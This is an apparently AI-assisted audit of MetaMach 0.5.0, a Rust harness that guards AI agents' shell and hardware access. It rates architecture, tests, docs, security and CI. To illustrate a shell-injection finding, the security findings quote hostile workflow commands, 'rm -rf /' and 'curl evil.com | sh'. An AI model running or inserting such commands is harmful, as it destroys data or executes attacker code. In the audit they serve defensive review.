# MetaMach 0.5.0 — Comprehensive Project Audit

> **Auditor:** DeepSeek V4 Pro (AI-assisted review)
> **Date:** 2026-07-26
> **Scope:** Full codebase, documentation, tests, CI/CD, architecture
> **Overall Rating:** **8/10** — A solid, gap-filling project with production-ready foundations

---

## Repo Vital Signs

| Metric | Value |
|---|---|
| Rust LOC | 14,245 |
| Documentation files | 42 |
| ADRs | 29 (23 implemented, 4 spec'd, 1 pending, 1 deferred) |
| Tests | 171 (all passing, 0 ignored, 0 failed) |
| Commits | 207 |
| Binary count | 4 (`janus-daemon`, `herdr-janus`, `janush`, `janus`) |
| Unsafe blocks | 4 (all justified and minimal) |
| `unwrap()` calls (non-test) | 142 |
| `clone()` calls | 87 |
| `///` doc comments | 417 for 152 public API items |

---

## 🎯 Gap Assessment: 9/10

MetaMach addresses a **genuine, underserviced gap**: safe physical-world execution for autonomous AI agents. No existing tool combines:

- **Tool Guard** (ALLOW/BLOCK/REWRITE per agent role at the shell boundary)
- **HITL Gateway** (human circuit-breaker via Teams Adaptive Cards)
- **Hardware pre-flight probes** (esptool, GPIO, physical device verification via ADR-026)
- **Survivable tmux sessions** (SIGHUP-immune, remain-on-exit, `tmux -L metamach-tmux`)
- **De-containerized native execution** (bare-metal PostgreSQL at `~/.metamach/db/`, no Docker overhead)
- **Cross-host SSH execution** with reverse-tunnel Tool Guard (ADR-017)

This is **not** another agent framework. It's an **execution harness** — a safety interlock between AI agents and the physical world. The spec-first approach (7 authoritative English docs + 29 ADRs) shows disciplined engineering uncommon in early-stage tools.

---

## 🏗️ Architecture: 8/10

### Strengths

| Area | Assessment |
|---|---|
| **Layered design** | Clean: janush (interception) → daemon (orchestration) → tmux/absurd/gateway (execution/storage/notification) |
| **UDS isolation** | Control plane communicates via Unix Domain Socket — no network-exposed attack surface |
| **ADR discipline** | 29 Architecture Decision Records with status tracking, version annotations, rationale sections |
| **`.janus/` consolidation** | ADR-029 simplified per-project config from scattered `blueprints/<name>/` + `workflows/` + `agents.toml` into one `.janus/` directory |
| **Cold-start resume** | Daemon restart picks up from last COMPLETED checkpoint; absurd pull-mode with lease extension |
| **Dual-track storage** | Primary Absurd PG → SQLite fallback ring buffer on outage → auto-replay |
| **Stream filter** | ANSI strip + progress bar collapse + duplicate dedup at PTY output boundary (ADR-018) |

### Issues

| # | Severity | Issue | Detail |
|---|---|---|---|
| A1 | ⚠️ Medium | **`workflow/mod.rs` is 1,481 lines** | Should split into `workflow/engine.rs`, `workflow/command.rs`, `workflow/checkpoint.rs`, `workflow/quota.rs` |
| A2 | ⚠️ Medium | **No structured error types** | `Response::Error { message: String }` prevents programmatic error handling in clients (herdr-janus, CLI) |
| A3 | 📝 Low | **Pipeline DAG not wired to daemon** | `pipeline.rs` validates and topologically sorts, but daemon's `Dispatch` only accepts a single `workflow`. No `DispatchPipeline` request exists |
| A4 | 📝 Low | **`anyhow` used for all error handling** | No library-level `thiserror` error enum. Callers can't match on error types — resort to string matching |

---

## 🔒 Code Quality: 7/10

### Strengths

- **Zero FIXME/TODO/HACK** — no deferred work markers, clean codebase
- **4 unsafe blocks, all minimal**: `libc::kill` (PID check), `libc::setsid` (process group), `env::remove_var` (test teardown × 2)
- **417 doc comments for 152 public APIs** — 2.7:1 ratio, well above average
- **Good anyhow/thiserror split**: `anyhow` for application code, `thiserror` for library types
- **Lockfile present** (`janus/Cargo.lock`)
- **Release profile optimized**: LTO + single codegen unit + stripped symbols
- **Dependencies lean**: 18 direct deps, no unused crates detected

### Issues

| # | Severity | Location | Issue |
|---|---|---|---|
| C1 | ⚠️ Medium | 142 locations across `src/` | **`.unwrap()` in non-test code**. Many in daemon startup and path resolution. A panic in `janus-daemon` kills all active workflow executions. Convert to `.context("...")?` |
| C2 | ⚠️ Medium | `agent.rs:173`, `tool_guard/rules.rs:56` | **Duplicate agent-loading logic**. Both modules independently parse `agents.toml` with identical error messages. Extract to shared `AgentRules::load()` |
| C3 | ⚠️ Medium | `workflow/mod.rs:803-830` | **No audit of step command shell injection**. `step_command()` constructs `janush -c '<command>'` with only `shell_quote()`. A malicious `command = "$(rm -rf /)"` in a workflow TOML could be evaluated |
| C4 | 📝 Low | `tests/gateway.rs` | **Dead test file**: 0 `#[test]` markers. The 3 gateway tests live in `src/gateway/mod.rs` as `#[tokio::test]`. Delete the empty file or move tests |
| C5 | 📝 Low | `src/spawn.rs`, `src/uds.rs`, `src/paths.rs` | **No unit tests** for these modules. Covered by integration tests but edge cases (missing `HOME`, corrupted env vars, PID collision) untested |
| C6 | 📝 Low | `configs/` vs `.janus/agents/` | **Agent loading precedence documented but not tested**. The merge behavior (project overrides global) has no dedicated test |

### Module Size Analysis

| Module | Lines | Health |
|---|---|---|
| `workflow/mod.rs` | 1,481 | ⚠️ Too large — needs splitting |
| `absurd/mod.rs` | 1,061 | ⚠️ Borderline — consider adapter extraction |
| `gateway/mod.rs` | 839 | ✅ Acceptable |
| `absurd/adapter.rs` | 784 | ✅ Acceptable |
| `bin/janus_daemon.rs` | 688 | ✅ Acceptable |
| `tool_guard/mod.rs` | 641 | ✅ Acceptable |
| `lifecycle.rs` | 628 | ✅ Acceptable |
| Rest | <600 each | ✅ Healthy |

---

## 📋 Documentation: 8/10

### Strengths

| Area | Assessment |
|---|---|
| **English specs** | 7 authoritative files (ARCH, PRD, Feature-Spec, Project-Plan, Review-Spec, Test-Spec, Deployment-Spec) |
| **ADRs** | 29 decisions with context, options considered, rationale, status |
| **README** | Freshly rewritten for 0.5.0 — accurate structure, `janus init` workflow, pipeline DAGs |
| **Test-Report** | Regenerated with 171 tests, CI dependency matrix, execution guide |
| **CHANGELOG** | Backfilled from ADR history (0.4.0–0.5.0) |
| **Module docs** | Every `src/*.rs` file has a module-level doc comment |
| **Integration docs** | `Herdr-Integration.md`, `Absurd-Integration.md` |

### Issues

| # | Severity | Location | Issue |
|---|---|---|---|
| D1 | 📝 Low | `docs/Deployment-Spec.md` §2 | Still references old Herdr paths from pre-0.3.0 (`~/.local/share/herdr/plugins/<id>`) |
| D2 | 📝 Low | `CHANGELOG.md` | Jumps from 0.4.3 to 0.4.5 — 0.4.4 missing (likely skipped, add a note) |
| D3 | 📝 Low | Root | No `CONTRIBUTING.md` or setup guide for new contributors beyond README |
| D4 | 📝 Low | `Cargo.toml` | Still says `version = "0.4.9"` and `description` says "0.4.0 Janus core" — should be 0.5.0 |

---

## 🧪 Testing: 8/10

### Coverage Breakdown

| Test Suite | Tests | Type | Gate |
|---|---|---|---|
| `src/lib.rs` (unit) | 117 | Unit | None |
| `src/bin/herdr_janus.rs` | 3 | TUI unit | None |
| `src/bin/janus.rs` | 5 | CLI unit | None |
| `tests/config_contract.rs` | 6 | Integration + E2E | Herdr runtime-skip |
| `tests/e2e_pipeline.rs` | 3 | E2E | PG + tmux runtime-skip |
| `tests/gateway.rs` | 0 | (empty — tests in gateway/mod.rs) | — |
| `tests/onboard_lifecycle.rs` | 8 | Integration | PG runtime-skip |
| `tests/protocol_contract.rs` | 5 | Contract | None |
| `tests/step_workflow.rs` | 7 | Integration | PG + tmux runtime-skip |
| `tests/tmux.rs` | 4 | Integration | tmux runtime-skip |
| `tests/uds_contract.rs` | 9 | Integration | None |
| **Total** | **171** | | |

### Strengths

- All 171 tests pass, 0 failed, 0 ignored
- Runtime-skip pattern: tests gracefully skip when deps unavailable (no `#[ignore]`)
- Full CI dependency coverage: PG (Docker), tmux (apt-get), Herdr (binary download + server)
- E2E coverage: onboard → dispatch → multi-step workflow → COMPLETED
- Herdr contract tests: manifest parse, version check, plugin link round-trip, full smoke test
- Pre-push hook mirrors CI exactly, auto-provisions PG + Herdr

### Issues

| # | Severity | Gap | Recommendation |
|---|---|---|---|
| T1 | ⚠️ Medium | **No pipeline DAG execution tests** | Pipeline dispatch not wired to daemon. When it is, add `e2e_dag_pipeline_diamond` test |
| T2 | 📝 Low | **No `spawn.rs` tests** | Test `janush` resolution, PATH edge cases, missing binary |
| T3 | 📝 Low | **No `paths.rs` tests** | Test Herdr env var resolution, standalone fallback, corrupted `HERDR_PLUGIN_ROOT` |
| T4 | 📝 Low | **No `uds.rs` tests** | Test socket timeout, partial writes, Unix socket permission denied |
| T5 | 📝 Low | **No load/stress tests** | Test 10+ concurrent workflow dispatches, PG connection pool exhaustion |
| T6 | 📝 Low | **No corrupted config recovery tests** | Test malformed `.janus/blueprint.toml`, missing `[openwiki]` section |

---

## 🛡️ Security: 8/10

### Strengths

| Area | Assessment |
|---|---|
| **Fail-closed default** | 30s timeout → BLOCK. Never passes through on uncertainty |
| **Tool Guard** | ALLOW/BLOCK/REWRITE per agent role with glob patterns and capability mapping |
| **UDS isolation** | Control plane inaccessible from network |
| **HMAC-SHA256** | Webhook callback validation for Teams Gateway |
| **Path traversal prevention** | `validate_name()` rejects `..`, `/`, spaces before any file I/O |
| **Zero-arg bypass** | Fixed (commit `57c4f2f`): `janush` with no args now exits 126 instead of exec'ing `/bin/sh` |
| **16KB dual defense** | Truncation at both janush (streaming) and daemon (pre-insert) |

### Issues

| # | Severity | Issue | Detail |
|---|---|---|---|
| S1 | ⚠️ Medium | **Shell injection via workflow TOML** | `command = "$(curl evil.com | sh)"` in a workflow file would be evaluated by `/bin/sh -c`. `shell_quote()` only handles single quotes. Consider `Command::new("bash")` with `-c` and proper argument splitting |
| S2 | 📝 Low | **No `cargo audit` in CI** | Vulnerable transitive dependencies won't be detected |
| S3 | 📝 Low | **No TOML fuzzing** | Malformed `agents.toml` or `blueprint.toml` could cause panics in `toml::from_str` |

---

## 🚀 Deployment / CI: 9/10

### Strengths

| Area | Assessment |
|---|---|
| **Single-command bootstrap** | `make bootstrap` → prereq check → compile → symlinks → db-init |
| **De-containerized** | Native PostgreSQL at `~/.metamach/db/`, no Docker on dev machine |
| **CI completeness** | PG (Docker service) + tmux (apt-get) + Herdr (release binary + server) — all 171 tests |
| **Pre-push hook** | Mirrors CI: fmt + clippy + test + PG auto-provision + paths-ignore for docs-only |
| **Binary optimization** | LTO + single codegen unit + strip (janus-daemon: 6.6M, janush: 491K) |
| **`janus init`** | Clean scaffolding from `templates/` into `.janus/` |

### Issues

| # | Severity | Issue | Detail |
|---|---|---|---|
| CI1 | 📝 Low | **No `cargo audit` step** | Add to catch vulnerable transitive deps |
| CI2 | 📝 Low | **No `cargo deny` step** | Check license compatibility, duplicate deps |
| CI3 | 📝 Low | **Build is not `--locked`** | CI uses `cargo build --release --locked` but `cargo test` does not |
| DEP1 | 📝 Low | **No versioned release artifacts** | CI builds but doesn't upload binaries. Consider GitHub Release on tag |
| DEP2 | 📝 Low | **`Cargo.toml` version still 0.4.9** | Should be 0.5.0 |

---

## 🔑 Actionable Recommendations

### High Priority (before 0.5.0 release)

| # | Action | Effort | Impact |
|---|---|---|---|
| **H1** | Reduce `.unwrap()` usage: audit 142 calls, convert to `.context("...")?` in daemon startup and path resolution | 2–3 hours | Prevents daemon panics killing active workflows |
| **H2** | De-duplicate agent loading: extract single `AgentRules::load(paths)` shared by `tool_guard` and `agent` | 1 hour | Eliminates parser divergence risk |
| **H3** | Audit `step_command` for shell injection: consider `Command::new("bash")` with `-c` and validate TOML `command` fields at recipe-validation time | 2 hours | Closes shell injection vector in workflow files |
| **H4** | Bump version: `Cargo.toml` 0.4.9 → 0.5.0, `herdr-plugin.toml` 0.4.9 → 0.5.0 | 5 min | Accurate release metadata |

### Medium Priority (post-0.5.0)

| # | Action | Effort | Impact |
|---|---|---|---|
| **M1** | Split `workflow/mod.rs` (1,481 lines) into sub-modules | 3–4 hours | Maintainability |
| **M2** | Add `ErrorCode` enum to `Response::Error` | 2 hours | Programmatic error handling in clients |
| **M3** | Add `spawn.rs` unit tests (janush resolution, PATH edge cases) | 1 hour | Coverage |
| **M4** | Add `paths.rs` unit tests (Herdr env var resolution, standalone fallback) | 1 hour | Coverage |
| **M5** | Delete empty `tests/gateway.rs` or move embedded tests there | 30 min | Cleanliness |

### Low Priority (nice-to-have)

| # | Action | Effort | Impact |
|---|---|---|---|
| **L1** | Add `cargo audit` and `cargo deny` to CI | 1 hour | Supply chain security |
| **L2** | Add `cargo test --locked` to CI | 5 min | Reproducible builds |
| **L3** | Add `CONTRIBUTING.md` | 1 hour | Onboarding |
| **L4** | Generate and upload release binaries in CI (GitHub Release on tag push) | 2 hours | Distribution |
| **L5** | Fix `Deployment-Spec.md` §2 stale Herdr paths | 30 min | Doc accuracy |
| **L6** | Add TOML fuzz tests for `agents.toml` and `blueprint.toml` parsing | 2 hours | Robustness |
| **L7** | Wire pipeline DAG dispatch to daemon (`Request::DispatchPipeline`) | 4–6 hours | Feature completeness |
| **L8** | Add concurrent workflow load test (10+ simultaneous dispatches) | 2 hours | Scalability validation |

---

## Conclusion

MetaMach 0.5.0 is a **well-engineered, gap-filling project** that solves a real problem: safely orchestrating autonomous AI agents against physical hardware and production systems. The architecture is sound, the test coverage is comprehensive (171 tests at 0 failed), the documentation is thorough (29 ADRs, 7 specs, full test report), and the CI/CD pipeline is mature (PG + tmux + Herdr, pre-push hook).

The main production-readiness gaps are: excessive `.unwrap()` usage in daemon code (risk of panics), shell injection potential in workflow step commands, and a few modules needing splitting/tests. None of these are architectural defects — they are the natural rough edges of a project that has moved fast from 0.3.0 to 0.5.0 while maintaining quality.

**Verdict: 8/10 — Ready for production use with the high-priority fixes applied.**
